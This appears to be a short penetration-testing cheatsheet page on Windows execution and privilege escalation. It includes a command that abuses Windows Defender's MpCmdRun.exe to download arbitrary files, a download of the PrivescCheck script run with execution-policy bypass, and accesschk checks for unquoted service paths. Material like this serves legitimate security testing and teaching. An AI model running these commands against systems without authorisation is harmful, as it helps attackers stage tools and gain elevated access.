---
layout: post
title: privesc / win / exec
category: privesc
parent: cheatsheets
modified_date: 2023-07-16
permalink: /privesc/win/exec
---

**Mitre Att&ck Entreprise**: [TA0002 - Execution](https://attack.mitre.org/tactics/TA0002/)

**Menu**
<!-- vscode-markdown-toc -->
* [dl](#dl)
* [rshell](#rshell)
* [escalation](#escalation)

<!-- vscode-markdown-toc-config
	numbering=false
	autoSave=true
	/vscode-markdown-toc-config -->
<!-- /vscode-markdown-toc -->

## <a name='dl'></a>dl
dl = download
* [/sys/powershell#transfer-http](/sys/powershell/transfer-http)
* [/dev/snippet#python-dl](/dev/snippet#python-dl)
* [juggernaut-sec](https://juggernaut-sec.com/windows-file-transfers-for-hackers/)
```sh
# download
C:\ProgramData\Microsoft\Windows Defender\platform\4.18.2008.9-0\MpCmdRun.exe -url <url> -path <local-path>
```

## <a name='escalation'></a>escalation

* [hacktricks.xyz](https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation)
* [payloadallthethings]()

```sh
# download privescCheck.ps1
wget https://raw.githubusercontent.com/itm4n/PrivescCheck/master/PrivescCheck.ps1

# extended execution + txt report
powershell -ep bypass -c ". .\PrivescCheck.ps1; Invoke-PrivescCheck -Extended -Report PrivescCheck_%COMPUTERNAME%"

# unquoted service path
accesschk /accepteula -uwdq "C:\Program Files\Unquoted Service Path"
accesschk /accepteula -uwdq "C:\Program Files (x86)\Windows Identity Foundation\v3.5\"
```